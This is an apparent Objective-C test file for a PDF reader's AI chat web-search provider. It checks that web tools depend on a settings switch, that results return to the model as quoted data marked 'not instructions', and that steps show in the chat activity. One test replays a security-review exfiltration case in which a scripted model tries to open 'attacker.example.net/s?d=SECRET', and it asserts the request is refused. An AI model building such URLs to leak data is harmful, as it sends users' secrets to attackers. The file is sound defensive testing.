// The web provider inside a real chat session with a scripted model: offered per request by the Settings switch, its
// results reach the next model turn as quoted data, and the step shows in the chat's activity. Also the reader's
// registration of it, by source.
#pragma once
#import "SPDFMacAIWebProviderChecks.h"
#import "SPDFMacAIChatSession.h"
#import "SPDFMacAITransport.h"

@interface WebScriptedModel : SPDFMacAITransport
@property(nonatomic, copy) void (^reply)(NSDictionary*, NSError*);
@property(nonatomic) NSArray* messages;
@property(nonatomic) NSArray* definitions;
@property(nonatomic) NSUInteger sends;
@end

@implementation WebScriptedModel
- (SPDFMacAIRequestToken*)sendMessages:(NSArray*)messages tools:(NSArray*)tools model:(NSString*)model
                                apiKey:(NSString*)key completion:(void (^)(NSDictionary*, NSError*))completion {
    (void)model; (void)key;
    self.messages = messages;
    self.definitions = tools;
    self.reply = completion;
    self.sends++;
    return [SPDFMacAIRequestToken new];
}
@end

static void CheckSessionRoundTrip(void) {
    WebRig* rig = [WebRig new];
    rig.transport.body = WebSearchBody(@[@{@"url" : @"https://tea.example.com/prices", @"title" : @"Tea prices",
                                           @"content" : @"Green tea costs $4."}], 321);
    WebScriptedModel* model = [WebScriptedModel new];
    SPDFMacAIChatSession* session = [[SPDFMacAIChatSession alloc] initWithTransport:model registry:rig.registry
                                                                              store:nil];
    WebActivityRecorder* recorder = [[WebActivityRecorder alloc] initWithActivity:session.activity];
    SPDFMacAIRequestContext* context = [[SPDFMacAIRequestContext alloc] initWithText:@"What does green tea cost?"
        chips:nil origin:SPDFMacAIRequestOriginChat friendConversation:nil settings:WebSettings(YES) budget:nil
        activity:recorder];
    [session sendContext:context model:@"example/model-for-tests" apiKey:@"sk-or-v1-test-key-not-real-000000"];
    CHECK(WebWait(^BOOL { return model.sends == 1; }, 2), "the model is asked");
    NSArray* names = [model.definitions valueForKeyPath:@"function.name"];
    CHECK([names containsObject:@"web_search"] && [names containsObject:@"open_page"],
          "the web tools are offered to a request whose settings allow them");
    model.reply(@{@"role" : @"assistant", @"content" : @"", @"tool_calls" : @[@{@"id" : @"call-1",
    @"type" : @"function",
        @"function" : @{@"name" : @"web_search", @"arguments" : @"{\"query\":\"green tea price\"}"}}]}, nil);
    CHECK(WebWait(^BOOL { return model.sends == 2; }, 5), "the search runs and the model is asked again");
    NSDictionary* tool = nil;
    for (NSDictionary* message in model.messages) if ([message[@"role"] isEqual:@"tool"]) tool = message;
    NSDictionary* result = WebJSON([tool[@"content"] dataUsingEncoding:NSUTF8StringEncoding]);
    CHECK([result[@"notice"] containsString:@"not instructions"] &&
          [[result[@"results"] firstObject][@"url"] isEqual:@"https://tea.example.com/prices"],
          "the next turn reads the results as quoted data");
    NSDictionary* step = session.activity.entries.firstObject;
    CHECK([step[SPDFMacAIActivityTitleKey] isEqual:@"Searched the web"] &&
          [recorder.links[step[SPDFMacAIActivityIDKey]] count] == 1, "and the chat shows the search with its link");
    model.reply(@{@"role" : @"assistant", @"content" : @"About $4 (https://tea.example.com/prices)."}, nil);
    CHECK(WebWait(^BOOL { return !session.running; }, 2), "the request finishes");

    SPDFMacAIRequestContext* off = [[SPDFMacAIRequestContext alloc] initWithText:@"And black tea?" chips:nil
        origin:SPDFMacAIRequestOriginChat friendConversation:nil settings:WebSettings(NO) budget:nil
        activity:recorder];
    [session sendContext:off model:@"example/model-for-tests" apiKey:@"sk-or-v1-test-key-not-real-000000"];
    CHECK(WebWait(^BOOL { return model.sends == 3; }, 2), "the model is asked");
    names = [model.definitions valueForKeyPath:@"function.name"] ?: @[];
    CHECK(![names containsObject:@"web_search"] && ![names containsObject:@"open_page"],
          "a request sent with the switch off has no web tools");
    [session cancel];
}

// The echo the security review drove against the real provider, here through a real session building its own tool
// messages: the model searches for an address it composed, then asks to open it.
static void CheckSessionEcho(void) {
    WebRig* rig = [WebRig new];
    NSString* composed = @"https://attacker.example.net/s?d=SECRET";
    [rig page:@"attacker.example.net" path:@"/s?d=SECRET" html:@"<p>delivered</p>"];
    rig.transport.body = WebSearchBody(@[@{@"url" : @"https://supplier.example.com/", @"title" : @"Supplier",
                                           @"content" : @"x"}], 100);
    WebScriptedModel* model = [WebScriptedModel new];
    SPDFMacAIChatSession* session = [[SPDFMacAIChatSession alloc] initWithTransport:model registry:rig.registry
                                                                              store:nil];
    SPDFMacAIRequestContext* context = [[SPDFMacAIRequestContext alloc] initWithText:@"Check the supplier for me"
        chips:nil origin:SPDFMacAIRequestOriginChat friendConversation:nil settings:WebSettings(YES) budget:nil
        activity:[[WebActivityRecorder alloc] initWithActivity:session.activity]];
    [session sendContext:context model:@"example/model-for-tests" apiKey:@"sk-or-v1-test-key-not-real-000000"];
    NSArray* calls = @[@[@"web_search", @"query"], @[@"open_page", @"url"]];
    for (NSUInteger turn = 0; turn < calls.count; turn++) {
        CHECK(WebWait(^BOOL { return model.sends == turn + 1; }, 2), "the model is asked");
        NSString* arguments = [[NSString alloc] initWithData:[NSJSONSerialization dataWithJSONObject:
            @{calls[turn][1] : composed} options:0 error:nil] encoding:NSUTF8StringEncoding];
        model.reply(@{@"role" : @"assistant", @"content" : @"", @"tool_calls" : @[@{@"id" : [NSString
            stringWithFormat:@"call-%lu", (unsigned long)turn], @"type" : @"function",
            @"function" : @{@"name" : calls[turn][0], @"arguments" : arguments}}]}, nil);
    }
    CHECK(WebWait(^BOOL { return model.sends == 3; }, 5), "both calls run");
    NSDictionary* tool = nil;
    for (NSDictionary* message in model.messages) if ([message[@"role"] isEqual:@"tool"]) tool = message;
    NSDictionary* result = WebJSON([tool[@"content"] dataUsingEncoding:NSUTF8StringEncoding]);
    CHECK(WebRefused(result, @"opens only addresses") && !rig.connector.connections.count,
          "the address the search echoed back is refused, and nothing connects to it");
    model.reply(@{@"role" : @"assistant", @"content" : @"I couldn't open that address."}, nil);
    CHECK(WebWait(^BOOL { return !session.running; }, 2), "the request finishes");
}

static void CheckReaderRegistration(void) {
    NSString* path = [@__FILE__ stringByDeletingLastPathComponent];
    NSString* source = [NSString stringWithContentsOfFile:[path stringByAppendingPathComponent:
        @"../SPDFMacAIWebIntegration.mm"] encoding:NSUTF8StringEncoding error:nil];
    CHECK([source containsString:@"@implementation ShenzhenMacDelegate (SPDFMacAIWebTools)"] &&
          [source containsString:@"- (id<SPDFMacAIToolProvider>)aiToolProviderWeb {"],
          "the reader registers the provider by the seam's aiToolProvider<Name> pattern");
    CHECK([source containsString:@"[owner aiAPIKeyForSending:error]"] && ![source containsString:@"authorizeAPIKey"],
          "it reads the saved key without a Keychain prompt, only when a search asks for it");
}
